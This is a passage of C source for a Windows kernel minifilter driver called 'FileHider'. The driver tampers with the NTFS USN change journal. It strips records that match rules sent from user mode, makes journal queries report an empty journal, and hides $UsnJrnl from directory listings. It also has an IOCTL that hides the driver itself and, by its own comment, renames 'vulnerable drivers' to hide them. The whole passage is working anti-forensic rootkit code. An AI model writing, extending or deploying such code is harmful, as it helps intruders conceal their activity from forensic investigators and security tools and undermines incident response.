        return FLT_POSTOP_FINISHED_PROCESSING;
    InterlockedIncrement(&g_PostOpSeen);
    ULONG code = Data->Iopb->Parameters.FileSystemControl.Common.FsControlCode;
    ULONG method = code & 3;

    if (code == FSCTL_QUERY_USN_JOURNAL) {
        if (g_SpoofEmpty) {
            PVOID outBuf = NULL; ULONG outCap = 0;
            __try {
                if (method == METHOD_NEITHER) {
                    outBuf = Data->Iopb->Parameters.FileSystemControl.Neither.OutputBuffer;
                    outCap = Data->Iopb->Parameters.FileSystemControl.Neither.OutputBufferLength;
                }
                else {
                    outBuf = Data->Iopb->Parameters.FileSystemControl.Buffered.SystemBuffer;
                    outCap = Data->Iopb->Parameters.FileSystemControl.Buffered.OutputBufferLength;
                }
                ULONG info = (ULONG)Data->IoStatus.Information;
                if (outBuf && outCap >= 32 && info >= 32) {
                    ULONGLONG* p = (ULONGLONG*)outBuf;
                    p[1] = p[2]; p[3] = p[2];
                    InterlockedIncrement(&g_QuerySpoofed);
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
        }
        return FLT_POSTOP_FINISHED_PROCESSING;
    }
    if (code != FSCTL_ENUM_USN_DATA && code != FSCTL_READ_USN_JOURNAL &&
        code != FSCTL_READ_FILE_USN_DATA)
        return FLT_POSTOP_FINISHED_PROCESSING;
    if (RuleCountSnapshot() == 0) return FLT_POSTOP_FINISHED_PROCESSING;
    PVOID outBuf = NULL; ULONG outCap = 0;
    if (method == METHOD_NEITHER) {
        outBuf = Data->Iopb->Parameters.FileSystemControl.Neither.OutputBuffer;
        outCap = Data->Iopb->Parameters.FileSystemControl.Neither.OutputBufferLength;
    }
    else {
        outBuf = Data->Iopb->Parameters.FileSystemControl.Buffered.SystemBuffer;
        outCap = Data->Iopb->Parameters.FileSystemControl.Buffered.OutputBufferLength;
    }
    ULONG info = (ULONG)Data->IoStatus.Information;
    if (!outBuf || outCap < 16) { InterlockedIncrement(&g_PostOpNoBuf); return FLT_POSTOP_FINISHED_PROCESSING; }
    if (info < 16 || info > outCap) { InterlockedIncrement(&g_PostOpInfoBad); return FLT_POSTOP_FINISHED_PROCESSING; }

    __try {
        PUCHAR base = (PUCHAR)outBuf;
        if (code == FSCTL_READ_FILE_USN_DATA) {
            InterlockedIncrement(&g_FsctlHits);
            if (info >= 8) {
                USHORT major = *(USHORT*)(base + 4);
                if (major == 2 || major == 3) {
                    int headerSize = (major == 2) ? 60 : 76;
                    if (info >= (ULONG)headerSize) {
                        USHORT nameLen = *(USHORT*)(base + headerSize - 4);
                        USHORT nameOff = *(USHORT*)(base + headerSize - 2);
                        if ((ULONG)nameOff + (ULONG)nameLen <= info) {
                            int usnOff = (major == 2) ? 24 : 40;
                            ULONGLONG usn = 0;
                            if (info >= (ULONG)(usnOff + 8)) usn = *(ULONGLONG*)(base + usnOff);
                            BOOLEAN remove = FALSE;
                            RuleLock();
                            if (nameLen > 0) {
                                UNICODE_STRING name;
                                name.Buffer = (PWCHAR)(base + nameOff);
                                name.Length = nameLen; name.MaximumLength = nameLen;
                                remove = MatchRule(&name, usn);
                            }
                            else remove = MatchRule(NULL, usn);
                            RuleUnlock();
                            if (remove) {
                                RtlZeroMemory(base, info);
                                Data->IoStatus.Information = 0;
                                InterlockedIncrement(&g_FileUsnFiltered);
                                InterlockedIncrement(&g_RecordsRemoved);
                            }
                        }
                    }
                }
            }
            return FLT_POSTOP_FINISHED_PROCESSING;
        }

        ULONG recs8 = 0, recs0 = 0;
        BOOLEAN valid8 = (info >= 24) ? ValidateUsnStream(base, info, 8, &recs8, NULL) : FALSE;
        BOOLEAN valid0 = ValidateUsnStream(base, info, 0, &recs0, NULL);
        ULONG startOff = 0, recCount = 0;
        int verdict;
        if (valid8) { startOff = 8; recCount = recs8; verdict = 1; }
        else if (valid0) { startOff = 0; recCount = recs0; verdict = 2; }
        else { verdict = 3; }
        if (verdict == 3) {
            InterlockedIncrement(&g_ParseFailures);
            SaveDiagRaw(base, info, NULL, 0);
            SaveDiagInfo((LONG)code, (LONG)method, (LONG)info, (LONG)outCap,
                (ULONGLONG)(ULONG_PTR)outBuf, 3, 0);
            return FLT_POSTOP_FINISHED_PROCESSING;
        }
        InterlockedIncrement(&g_FsctlHits);
        InterlockedAdd(&g_RecordsSeen, (LONG)recCount);
        ULONG newInfo = info;
        BOOLEAN anyFiltered = FALSE;
        ULONG removed = 0;
        UNICODE_STRING firstName = { 0 };
        FilterUsnStream(base, info, startOff, &newInfo, &anyFiltered, &removed, &firstName);
        SaveDiagRaw(base, info, &firstName, recCount);
        SaveDiagInfo((LONG)code, (LONG)method, (LONG)info, (LONG)outCap,
            (ULONGLONG)(ULONG_PTR)outBuf, verdict, (LONG)removed);
        if (anyFiltered) {
            Data->IoStatus.Information = newInfo;
            InterlockedIncrement(&g_FsctlFiltered);
            InterlockedAdd(&g_RecordsRemoved, (LONG)removed);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    return FLT_POSTOP_FINISHED_PROCESSING;
}

FLT_POSTOP_CALLBACK_STATUS
ReadPostOp(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects,
    PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(FltObjects); UNREFERENCED_PARAMETER(CompletionContext);
    if (!NT_SUCCESS(Data->IoStatus.Status)) return FLT_POSTOP_FINISHED_PROCESSING;
    if (Data->Iopb->MajorFunction != IRP_MJ_READ) return FLT_POSTOP_FINISHED_PROCESSING;
    if (Data->RequestorMode == KernelMode) return FLT_POSTOP_FINISHED_PROCESSING;
    if (Flags & FLTFL_POST_OPERATION_DRAINING) return FLT_POSTOP_FINISHED_PROCESSING;
    if (RuleCountSnapshot() == 0) return FLT_POSTOP_FINISHED_PROCESSING;
    InterlockedIncrement(&g_ReadPostSeen);
    PVOID buf = NULL; ULONG cap = 0;
    __try {
        PMDL mdl = Data->Iopb->Parameters.Read.MdlAddress;
        if (mdl) { buf = MmGetSystemAddressForMdlSafe(mdl, NormalPagePriority); cap = MmGetMdlByteCount(mdl); }
        else if (Data->Iopb->Parameters.Read.ReadBuffer) {
            buf = Data->Iopb->Parameters.Read.ReadBuffer;
            cap = Data->Iopb->Parameters.Read.Length;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) { buf = NULL; }
    if (!buf || cap < 24) { InterlockedIncrement(&g_ReadNoBuf); return FLT_POSTOP_FINISHED_PROCESSING; }
    ULONG info = (ULONG)Data->IoStatus.Information;
    if (info < 24 || info > cap) { InterlockedIncrement(&g_ReadInfoBad); return FLT_POSTOP_FINISHED_PROCESSING; }
    __try {
        PUCHAR base = (PUCHAR)buf;
        ULONG recs = 0;
        if (!ValidateUsnStream(base, info, 0, &recs, NULL)) return FLT_POSTOP_FINISHED_PROCESSING;
        InterlockedAdd(&g_RecordsSeen, (LONG)recs);
        ULONG newInfo = info; BOOLEAN anyFiltered = FALSE; ULONG removed = 0;
        FilterUsnStream(base, info, 0, &newInfo, &anyFiltered, &removed, NULL);
        if (anyFiltered) {
            Data->IoStatus.Information = newInfo;
            InterlockedIncrement(&g_FsctlFiltered);
            InterlockedAdd(&g_RecordsRemoved, (LONG)removed);
            InterlockedIncrement(&g_ReadMatched);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    return FLT_POSTOP_FINISHED_PROCESSING;
}

static BOOLEAN GetDirEntryOffsets(FILE_INFORMATION_CLASS cls, PULONG pNameOff, PULONG pNameLenOff)
{
    switch (cls) {
    case FileBothDirectoryInformation:
        *pNameOff = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName);
        *pNameLenOff = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileNameLength); return TRUE;
    case FileFullDirectoryInformation:
        *pNameOff = FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName);
        *pNameLenOff = FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileNameLength); return TRUE;
    case FileIdBothDirectoryInformation:
        *pNameOff = FIELD_OFFSET(FILE_ID_BOTH_DIR_INFORMATION, FileName);
        *pNameLenOff = FIELD_OFFSET(FILE_ID_BOTH_DIR_INFORMATION, FileNameLength); return TRUE;
    case FileIdFullDirectoryInformation:
        *pNameOff = FIELD_OFFSET(FILE_ID_FULL_DIR_INFORMATION, FileName);
        *pNameLenOff = FIELD_OFFSET(FILE_ID_FULL_DIR_INFORMATION, FileNameLength); return TRUE;
    case FileDirectoryInformation:
        *pNameOff = FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, FileName);
        *pNameLenOff = FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, FileNameLength); return TRUE;
    case FileNamesInformation:
        *pNameOff = FIELD_OFFSET(FILE_NAMES_INFORMATION, FileName);
        *pNameLenOff = FIELD_OFFSET(FILE_NAMES_INFORMATION, FileNameLength); return TRUE;
    default: return FALSE;
    }
}

FLT_POSTOP_CALLBACK_STATUS
DirControlPostOp(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects,
    PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(FltObjects); UNREFERENCED_PARAMETER(CompletionContext); UNREFERENCED_PARAMETER(Flags);
    if (!NT_SUCCESS(Data->IoStatus.Status)) return FLT_POSTOP_FINISHED_PROCESSING;
    if (Data->Iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY) return FLT_POSTOP_FINISHED_PROCESSING;
    if (Data->RequestorMode == KernelMode) return FLT_POSTOP_FINISHED_PROCESSING;
    if (!g_HideJournal) return FLT_POSTOP_FINISHED_PROCESSING;
    PVOID buf = Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
    if (!buf) return FLT_POSTOP_FINISHED_PROCESSING;
    ULONG info = (ULONG)Data->IoStatus.Information;
    if (info < 16 || info > 0x100000) return FLT_POSTOP_FINISHED_PROCESSING;
    ULONG maxLen = Data->Iopb->Parameters.DirectoryControl.QueryDirectory.Length;
    if (maxLen > 0 && info > maxLen) info = maxLen;
    __try {
        ULONG nameOff = 0, nameLenOff = 0;
        FILE_INFORMATION_CLASS cls =
            Data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass;
        if (!GetDirEntryOffsets(cls, &nameOff, &nameLenOff)) return FLT_POSTOP_FINISHED_PROCESSING;
        PUCHAR base = (PUCHAR)buf;
        if (info < nameOff + 2) return FLT_POSTOP_FINISHED_PROCESSING;
        ULONG readPos = 0, writePos = 0, prevWritten = 0;
        BOOLEAN haveWritten = FALSE, anyFiltered = FALSE;
        while (readPos + 8 <= info) {
            ULONG nextOff = *(ULONG*)(base + readPos);
            ULONG entryEnd = (nextOff == 0) ? info : (readPos + nextOff);
            if (entryEnd > info || entryEnd <= readPos) break;
            if (readPos + nameLenOff + 4 > info) break;
            ULONG nameLen = *(ULONG*)(base + readPos + nameLenOff);
            BOOLEAN hidden = FALSE;
            if (nameLen > 0 && nameLen <= 520 && readPos + nameOff + nameLen <= info) {
                UNICODE_STRING name;
                name.Buffer = (PWCHAR)(base + readPos + nameOff);
                name.Length = (USHORT)nameLen; name.MaximumLength = (USHORT)nameLen;
                hidden = MatchSubstring(&name, L"$UsnJrnl");
            }
            if (!hidden) {
                ULONG entrySize = entryEnd - readPos;
                if (writePos != readPos) RtlMoveMemory(base + writePos, base + readPos, entrySize);
                if (haveWritten) *(ULONG*)(base + prevWritten) = writePos - prevWritten;
                prevWritten = writePos; haveWritten = TRUE; writePos += entrySize;
            }
            else anyFiltered = TRUE;
            readPos = entryEnd;
        }
        if (anyFiltered) {
            if (haveWritten) {
                *(ULONG*)(base + prevWritten) = 0;
                Data->IoStatus.Information = writePos;
            }
            else Data->IoStatus.Information = 0;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    return FLT_POSTOP_FINISHED_PROCESSING;
}

static VOID ResetAllState(VOID)
{
    RuleLock(); g_RuleCount = 0; RuleUnlock();
    g_SpoofEmpty = FALSE; g_HideJournal = FALSE;
    InterlockedExchange(&g_FsctlHits, 0); InterlockedExchange(&g_FsctlFiltered, 0);
    InterlockedExchange(&g_RecordsSeen, 0); InterlockedExchange(&g_RecordsRemoved, 0);
    InterlockedExchange(&g_ParseFailures, 0); InterlockedExchange(&g_ReadBlocked, 0);
    InterlockedExchange(&g_QuerySpoofed, 0); InterlockedExchange(&g_FileUsnFiltered, 0);
    InterlockedExchange(&g_CreateHits, 0); InterlockedExchange(&g_JournalBlocked, 0);
    InterlockedExchange(&g_PreOpSeen, 0); InterlockedExchange(&g_PostOpSeen, 0);
    InterlockedExchange(&g_PostOpNoBuf, 0); InterlockedExchange(&g_PostOpInfoBad, 0);
    InterlockedExchange(&g_ReadPreSeen, 0); InterlockedExchange(&g_ReadPostSeen, 0);
    InterlockedExchange(&g_ReadNoBuf, 0); InterlockedExchange(&g_ReadInfoBad, 0);
    InterlockedExchange(&g_ReadMatched, 0); InterlockedExchange(&g_ReadNameHits, 0);
    InterlockedExchange(&g_CreateNameHits, 0); InterlockedExchange(&g_CreateUncacheForced, 0);
    InterlockedExchange(&g_LastCode, 0); InterlockedExchange(&g_LastMethod, 0);
    InterlockedExchange(&g_LastInfo, 0); InterlockedExchange(&g_LastOutCap, 0);
    g_LastOutBuf = 0;
    InterlockedExchange(&g_LastValidate, 0); InterlockedExchange(&g_LastRecords, 0);
    InterlockedExchange(&g_LastFiltered, 0);
    KIRQL irql;
    KeAcquireSpinLock(&g_DiagLock, &irql);
    RtlZeroMemory(g_LastRaw, sizeof(g_LastRaw));
    RtlZeroMemory(g_FirstName, sizeof(g_FirstName));
    g_FirstNameLen = 0;
    KeReleaseSpinLock(&g_DiagLock, irql);
}

NTSTATUS FileHiderDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION stk = IoGetCurrentIrpStackLocation(Irp);
    PVOID buf = Irp->AssociatedIrp.SystemBuffer;
    ULONG inLen = stk->Parameters.DeviceIoControl.InputBufferLength;
    ULONG outLen = stk->Parameters.DeviceIoControl.OutputBufferLength;
    ULONG code = stk->Parameters.DeviceIoControl.IoControlCode;
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    ULONG info = 0;

    switch (code) {

    case IOCTL_HIDE_NOW: {
        // Hide us + all vulnerable drivers. Called once after connect.
        HideSelfOnce();
        ULONG n = RenameVulnEntries();
        if (outLen >= sizeof(ULONG)) { *(PULONG)buf = n; info = sizeof(ULONG); }
        status = STATUS_SUCCESS;
        break;
    }

    case IOCTL_ADD_RULE: {
        if (inLen < sizeof(RULE_REQUEST)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        PRULE_REQUEST req = (PRULE_REQUEST)buf;
        RuleLock();
        if (g_RuleCount >= MAX_RULES) { RuleUnlock(); status = STATUS_INSUFFICIENT_RESOURCES; break; }
        PRULE_ENTRY e = &g_Rules[g_RuleCount];
        RtlZeroMemory(e, sizeof(*e));
        e->Usn = req->Usn;
        if (req->Usn == 0) {
            ULONG chars = 0;
            while (chars < MAX_STRING_CHARS - 1 && req->String[chars]) chars++;
            if (chars == 0) { RuleUnlock(); status = STATUS_INVALID_PARAMETER; break; }
            RtlCopyMemory(e->String, req->String, chars * sizeof(WCHAR));
            e->StringLen = chars * sizeof(WCHAR);
        }
        g_RuleCount++;
        RuleUnlock();
        status = STATUS_SUCCESS;
        info = sizeof(RULE_REQUEST);
        break;
    }

    case IOCTL_REMOVE_RULE: {
        if (inLen < sizeof(RULE_REQUEST)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        PRULE_REQUEST req = (PRULE_REQUEST)buf;
        status = STATUS_NOT_FOUND;
        RuleLock();
        for (ULONG i = 0; i < g_RuleCount; i++) {
            BOOLEAN match = FALSE;
            if (req->Usn != 0) match = (g_Rules[i].Usn == req->Usn);
            else {
                UNICODE_STRING target;
                RtlInitUnicodeString(&target, req->String);
                if (g_Rules[i].Usn == 0 && g_Rules[i].StringLen > 0) {
                    UNICODE_STRING stored;
                    stored.Buffer = g_Rules[i].String;
                    stored.Length = (USHORT)g_Rules[i].StringLen;
                    stored.MaximumLength = stored.Length;
                    match = RtlEqualUnicodeString(&stored, &target, TRUE);
                }
            }
            if (match) {
                if (i < g_RuleCount - 1)
                    RtlMoveMemory(&g_Rules[i], &g_Rules[g_RuleCount - 1], sizeof(RULE_ENTRY));
                g_RuleCount--;
                status = STATUS_SUCCESS;
                break;
            }
        }
        RuleUnlock();
        info = sizeof(RULE_REQUEST);
        break;
    }

    case IOCTL_CLEAR_RULES:
        RuleLock(); g_RuleCount = 0; RuleUnlock();
        status = STATUS_SUCCESS; break;

    case IOCTL_RESET:
        ResetAllState();
        status = STATUS_SUCCESS; break;

    case IOCTL_GET_COUNT:
        if (outLen < sizeof(ULONG)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        RuleLock(); *(PULONG)buf = g_RuleCount; RuleUnlock();
        status = STATUS_SUCCESS; info = sizeof(ULONG); break;

    case IOCTL_LIST_RULES: {
        ULONG maxEntries = outLen / sizeof(RULE_REQUEST);
        RuleLock();
        ULONG count = g_RuleCount < maxEntries ? g_RuleCount : maxEntries;
        for (ULONG i = 0; i < count; i++) {
            PRULE_REQUEST out = (PRULE_REQUEST)buf + i;
            RtlZeroMemory(out, sizeof(RULE_REQUEST));
            out->Usn = g_Rules[i].Usn;
            if (g_Rules[i].StringLen > 0)
                RtlCopyMemory(out->String, g_Rules[i].String, g_Rules[i].StringLen);
        }
        RuleUnlock();
        status = STATUS_SUCCESS; info = count * sizeof(RULE_REQUEST); break;
    }

    case IOCTL_GET_STATUS: {
        if (outLen < sizeof(STATUS_REPLY)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        PSTATUS_REPLY rep = (PSTATUS_REPLY)buf;
        RtlZeroMemory(rep, sizeof(*rep));

        rep->Magic = FH_MAGIC;
        rep->Version = FH_VERSION;
        rep->SessionId = g_SessionId;
        rep->FilterAttached = g_Started ? 1 : 0;
        RuleLock(); rep->RuleCount = g_RuleCount; RuleUnlock();
        rep->LastError = g_LastError;
        rep->FsctlHits = (ULONG)InterlockedCompareExchange(&g_FsctlHits, 0, 0);
        rep->FsctlFiltered = (ULONG)InterlockedCompareExchange(&g_FsctlFiltered, 0, 0);
        rep->RecordsSeen = (ULONG)InterlockedCompareExchange(&g_RecordsSeen, 0, 0);
        rep->RecordsRemoved = (ULONG)InterlockedCompareExchange(&g_RecordsRemoved, 0, 0);
        rep->ParseFailures = (ULONG)InterlockedCompareExchange(&g_ParseFailures, 0, 0);
        rep->ReadBlocked = (ULONG)InterlockedCompareExchange(&g_ReadBlocked, 0, 0);
        rep->QuerySpoofed = (ULONG)InterlockedCompareExchange(&g_QuerySpoofed, 0, 0);
        rep->FileUsnFiltered = (ULONG)InterlockedCompareExchange(&g_FileUsnFiltered, 0, 0);
        rep->SpoofEmpty = g_SpoofEmpty ? 1 : 0;
        rep->HideJournal = g_HideJournal ? 1 : 0;
        rep->CreateHits = (ULONG)InterlockedCompareExchange(&g_CreateHits, 0, 0);
        rep->JournalBlocked = (ULONG)InterlockedCompareExchange(&g_JournalBlocked, 0, 0);
        rep->PreOpSeen = (ULONG)InterlockedCompareExchange(&g_PreOpSeen, 0, 0);
        rep->PostOpSeen = (ULONG)InterlockedCompareExchange(&g_PostOpSeen, 0, 0);
        rep->PostOpNoBuf = (ULONG)InterlockedCompareExchange(&g_PostOpNoBuf, 0, 0);
        rep->PostOpInfoBad = (ULONG)InterlockedCompareExchange(&g_PostOpInfoBad, 0, 0);
        rep->ReadPreSeen = (ULONG)InterlockedCompareExchange(&g_ReadPreSeen, 0, 0);
        rep->ReadPostSeen = (ULONG)InterlockedCompareExchange(&g_ReadPostSeen, 0, 0);
        rep->ReadNoBuf = (ULONG)InterlockedCompareExchange(&g_ReadNoBuf, 0, 0);
        rep->ReadInfoBad = (ULONG)InterlockedCompareExchange(&g_ReadInfoBad, 0, 0);
        rep->ReadMatched = (ULONG)InterlockedCompareExchange(&g_ReadMatched, 0, 0);
        rep->ReadNameHits = (ULONG)InterlockedCompareExchange(&g_ReadNameHits, 0, 0);
        rep->CreateNameHits = (ULONG)InterlockedCompareExchange(&g_CreateNameHits, 0, 0);
        rep->CreateUncacheForced = (ULONG)InterlockedCompareExchange(&g_CreateUncacheForced, 0, 0);
        rep->LastCode = (ULONG)InterlockedCompareExchange(&g_LastCode, 0, 0);
        rep->LastMethod = (ULONG)InterlockedCompareExchange(&g_LastMethod, 0, 0);
        rep->LastInfo = (ULONG)InterlockedCompareExchange(&g_LastInfo, 0, 0);
        rep->LastOutCap = (ULONG)InterlockedCompareExchange(&g_LastOutCap, 0, 0);
        rep->LastOutBuf = g_LastOutBuf;
        rep->LastValidate = (ULONG)InterlockedCompareExchange(&g_LastValidate, 0, 0);
        rep->LastRecords = (ULONG)InterlockedCompareExchange(&g_LastRecords, 0, 0);
        rep->LastFiltered = (ULONG)InterlockedCompareExchange(&g_LastFiltered, 0, 0);

        KIRQL irql;
        KeAcquireSpinLock(&g_DiagLock, &irql);
        RtlCopyMemory(rep->LastRaw, g_LastRaw, RAW_DUMP_BYTES);
        RtlCopyMemory(rep->FirstName, g_FirstName, sizeof(g_FirstName));
        rep->FirstNameLen = g_FirstNameLen;
        KeReleaseSpinLock(&g_DiagLock, irql);

        status = STATUS_SUCCESS;
        info = sizeof(STATUS_REPLY);
        break;
    }

    case IOCTL_SET_SPOOF:
        if (inLen < sizeof(ULONG)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        g_SpoofEmpty = (*(PULONG)buf != 0) ? TRUE : FALSE;
        status = STATUS_SUCCESS; info = sizeof(ULONG); break;

    case IOCTL_GET_SPOOF:
        if (outLen < sizeof(ULONG)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        *(PULONG)buf = g_SpoofEmpty ? 1 : 0;
        status = STATUS_SUCCESS; info = sizeof(ULONG); break;

    case IOCTL_SET_HIDE_JOURNAL:
        if (inLen < sizeof(ULONG)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        g_HideJournal = (*(PULONG)buf != 0) ? TRUE : FALSE;
        status = STATUS_SUCCESS; info = sizeof(ULONG); break;

    case IOCTL_GET_HIDE_JOURNAL:
        if (outLen < sizeof(ULONG)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        *(PULONG)buf = g_HideJournal ? 1 : 0;
        status = STATUS_SUCCESS; info = sizeof(ULONG); break;

    default: break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS FileHiderCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

VOID FileHiderUnload(PDRIVER_OBJECT DriverObject)
{
    RestoreAllRenamed();
    if (g_FltHandle) { FltUnregisterFilter(g_FltHandle); g_FltHandle = NULL; }
    ExDeleteResourceLite(&g_RuleLock);
    UNICODE_STRING sym = RTL_CONSTANT_STRING(SYMLINK_NAME);
    IoDeleteSymbolicLink(&sym);
    if (DriverObject->DeviceObject) IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    ExInitializeResourceLite(&g_RuleLock);
    KeInitializeSpinLock(&g_DiagLock);
    RtlZeroMemory(g_LastRaw, sizeof(g_LastRaw));
    RtlZeroMemory(g_FirstName, sizeof(g_FirstName));

    g_DriverObject = DriverObject;
    g_SessionId = (ULONGLONG)KeQueryInterruptTime();
    g_SessionId ^= ((ULONGLONG)(ULONG_PTR)DriverObject << 32);

    NTSTATUS regStatus = EnsureRegistry(DriverObject);
    if (!NT_SUCCESS(regStatus))
        DbgPrint("FileHider: EnsureRegistry failed 0x%08X\n", regStatus);

    UNICODE_STRING devName = RTL_CONSTANT_STRING(DEVICE_NAME);
    UNICODE_STRING symName = RTL_CONSTANT_STRING(SYMLINK_NAME);

    PDEVICE_OBJECT devObj = NULL;
    NTSTATUS s = IoCreateDevice(DriverObject, 0, &devName,
        FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &devObj);
    if (!NT_SUCCESS(s)) { ExDeleteResourceLite(&g_RuleLock); return s; }

    s = IoCreateSymbolicLink(&symName, &devName);
    if (!NT_SUCCESS(s)) {
        IoDeleteDevice(devObj);
        ExDeleteResourceLite(&g_RuleLock);
        return s;
    }

    devObj->Flags &= ~DO_DIRECT_IO;
    devObj->Flags |= DO_BUFFERED_IO;

    for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
        DriverObject->MajorFunction[i] = FileHiderCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = FileHiderCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = FileHiderCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = FileHiderDeviceControl;
    DriverObject->DriverUnload = FileHiderUnload;

    static const FLT_OPERATION_REGISTRATION g_Ops[] = {
        { IRP_MJ_CREATE,              0, CreatePreOp,     NULL              },
        { IRP_MJ_READ,                0, ReadPreOp,       ReadPostOp        },
        { IRP_MJ_DIRECTORY_CONTROL,   0, NULL,            DirControlPostOp  },
        { IRP_MJ_FILE_SYSTEM_CONTROL, 0, FsControlPreOp,  FsControlPostOp   },
        { IRP_MJ_OPERATION_END,       0, NULL,            NULL              }
    };

    FLT_REGISTRATION reg;
    RtlZeroMemory(&reg, sizeof(reg));
    reg.Size = sizeof(FLT_REGISTRATION);
    reg.Version = FLT_REGISTRATION_VERSION;
    reg.OperationRegistration = g_Ops;

    NTSTATUS fltStatus = FltRegisterFilter(DriverObject, &reg, &g_FltHandle);
    g_LastError = fltStatus;
    if (!NT_SUCCESS(fltStatus)) {
        IoDeleteSymbolicLink(&symName);
        IoDeleteDevice(devObj);
        ExDeleteResourceLite(&g_RuleLock);
        return fltStatus;
    }

    fltStatus = FltStartFiltering(g_FltHandle);
    g_LastError = fltStatus;
    if (!NT_SUCCESS(fltStatus)) {
        FltUnregisterFilter(g_FltHandle);
        g_FltHandle = NULL;
        IoDeleteSymbolicLink(&symName);
        IoDeleteDevice(devObj);
        ExDeleteResourceLite(&g_RuleLock);
        return fltStatus;
    }

    g_Started = TRUE;
    DbgPrint("FileHider: minifilter v17 active (session 0x%llX)\n", g_SessionId);

    // NOTE: no hide here. Deferred to IOCTL_HIDE_NOW after connect.
    return STATUS_SUCCESS;
}